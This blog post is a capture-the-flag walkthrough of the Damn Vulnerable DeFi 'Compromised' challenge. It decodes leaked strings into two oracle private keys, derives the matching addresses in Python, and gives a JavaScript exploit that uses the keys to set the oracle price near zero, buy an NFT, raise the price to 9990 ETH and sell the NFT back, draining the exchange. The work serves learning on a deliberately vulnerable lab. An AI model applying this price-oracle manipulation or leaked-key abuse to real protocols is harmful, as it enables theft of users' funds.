---
layout: post
date:   2022-08-21 12:59:00 -0500
categories: DeFi flashloan Oracle
title: Damn Vulnerable DeFi - Compromised
---

# [Compromised](https://www.damnvulnerabledefi.xyz/challenges/7.html)

## Analysis

Challenge snippet seems to contain hex characters:

```txt
4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34  
```

Which seem to be base64...

```sh
$ echo -n "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35" | xxd -r -p | base64 -d

0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

$ echo -n "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34" | xxd -r -p | base64 -d

0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

### Theories

- These may be x,y coordinates of a public key.

   ```
   0x04c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
   ```
   Prefix of 0x04 because Ethereum uses uncompressed public keys:

   Resource: [https://www.oreilly.com/library/view/mastering-ethereum/9781491971932/ch04.html](https://www.oreilly.com/library/view/mastering-ethereum/9781491971932/ch04.html)

   - Computing an address Keccak-256(publickey) omitting the 0x04 prefix

   ```
   02440a7ee8a39494dddaced5b0a415e392e62702a4e3a275602f392f82be285f
   ```
   Suffix 20bytes

   ```
   0xb0a415e392e62702a4e3a275602f392f82be285f
   ```

   A public key is useless since it is "public"

-  These could be  private keys: [https://consensys.github.io/smart-contract-best-practices/attacks/oracle-manipulation/#centralized-oracles-and-trust](https://consensys.github.io/smart-contract-best-practices/attacks/oracle-manipulation/#centralized-oracles-and-trust).

    Private keys are 32bytes in length.

    Need to compute the matching public key and hence address to see which oracle(s) were compromised.

    ```py
    import ecdsa, codecs
    # pycryptodome
    from Crypto.Hash import keccak

    >>> unknown_data1 = "c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
    >>> unknown_data2 = "208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
    >>> def getPublicKeyFromPrivateECDSA(privkey_hex):
    ...    privkey_as_bytes = codecs.decode(privkey_hex, 'hex')
    ...    pubkey_as_signing = ecdsa.SigningKey.from_string(privkey_as_bytes, curve=ecdsa.SECP256k1).verifying_key
    ...    pubkey_as_bytes = pubkey_as_signing.to_string()
    ...    pubkey_hex = codecs.encode(pubkey_as_bytes, 'hex')
    ...    return pubkey_hex
    ...
    >>> getPublicKeyFromPrivateECDSA(unknown_data1)
    b'5c1b119edd97e67393409f959f810ccbf82690c7d86f88a8cf5b748011400b6c9cc17f448703c3ee30a5d0dedc1b078519ad14221f57aa517d671812d00159fd'
    >>> getPublicKeyFromPrivateECDSA(unknown_data2)
    b'555945b73af0ba039e1ab1b9f02f2840573364318219f14436dbd5f753cd8ba33cb1ecb4ec13ccb42258e845318f3905777a4be2ee8b7d979b3685b90fc51ed4'
    >>> import keccak
    >>> def getAddrFromPubKey(pubkey_hex):
    ...     pubkey_as_bytes = codecs.decode(pubkey_hex, 'hex')
    ...     keccak_hash = keccak.new(digest_bits=256)
    ...     keccak_hash.update(pubkey_as_bytes)
    ...     keccak_digest = keccak_hash.hexdigest()
    ...     return '0x'+ keccak_digest[-40:]
    ...
    >>> getAddrFromPubKey(pubkey_1)
    '0xe92401a4d3af5e446d93d11eec806b1462b39d15'
    >>> getAddrFromPubKey(pubkey_2)
    '0x81a5d6e50c214044be44ca0cb057fe119097850c'
    ```

    These addresses match the address of the sources!

    Turns out you can do these computations with library functions from web3.js or ethers.js but I preferred learning the crypto involved.

- `Exchange.sol`

    Allows a user with sufficient balance to buy the DVNFT token and allows a user to buy the token if the Exchange has enough funds.

    The price is determined by median computation from the provided oracles

    A user can sell a token TO the Exchange using the `sellOne` routine, the Exchange pays the user the `currentPriceInWei`

    A user can buy a token FROM the Exchange using the `buyOne` routine, the user pays the exchange `currentPriceInWei`

- `TrustfulOracleInitializer.sol`

    initializes the oracles with initial prices by invoking `setupInitialPrices`

- `TrustfulOracle.sol`

    Assigns some useful roles like `TRUSTED_SOURCE_ROLE` for the on-chain sources and `INITIALIZER_ROLE` for the initializer contract. The latter role is useful once after which it is stripped.

    Trusted sources can set new price for the token using the `postPrice` routine

Money leaves the exchange when `sellOne` is invoked. An idea is to manipulate the oracle price. Buy it cheaper, sell it very expensive. Reset the price.

## Problem

Leaked private keys of oracles can be used to manipulate the exchange by manipulating prices reported by the oracles


## Exploit

- compromised.challengee.js
```js
...
    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        // initialize source wallets from private keys
        var source2_private_key = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";

        var source3_private_key = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

        var source2_wallet = new ethers.Wallet(source2_private_key, ethers.provider);

        var source3_wallet = new ethers.Wallet(source3_private_key, ethers.provider);

        // manipulate the Oracles make it cost too little
        await this.oracle.connect(source2_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('0.0'));
        await this.oracle.connect(source3_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('0.0'));

        // Attacker is too broke, give it 2ETH
        await source2_wallet.sendTransaction({
            to: attacker.address,
            value: utils.parseEther("1.0")
        });
        await source3_wallet.sendTransaction({
            to: attacker.address,
            value: utils.parseEther("1.0")
        });

        // BuyOne as attacker
        const options = {value: ethers.utils.parseEther("0.1")};
        var tx = await this.exchange.connect(attacker).buyOne(options);
        var receipt = await tx.wait()
        //var tokenId, by, price;
        for (const event of receipt.events) {
            if (event.event == "TokenBought"){
                var {by,tokenId,price} = event.args;
            }
          }


        // manipulate the Oracles make it cost everything
        // including what was paid to buyone
        await this.oracle.connect(source2_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('9990'));
        await this.oracle.connect(source3_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('9990'));

        // SellOne as attacker
        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
        var tx = await this.exchange.connect(attacker).sellOne(tokenId);

        // manipulate the Oracles make it original everything
        await this.oracle.connect(source2_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('999'));
        await this.oracle.connect(source3_wallet).postPrice(this.nftToken.symbol(), ethers.utils.parseEther('999'));

    });
...
```

## Explanation

1. Attacker needs to afford one tokens with <=0.1 ETH.
2. Attacker needs to sell the token to the exchange for 9990 ETH.
3. Attacker uses compromised accounts to get more ETH.
3. Attacker manipulates the prices by using the compromised source accounts to `postPrice` such that the calculated median token cost is favourable to the attacker e.g 0 to buy and 9990 to sell
4. The attacker resets the price in the end.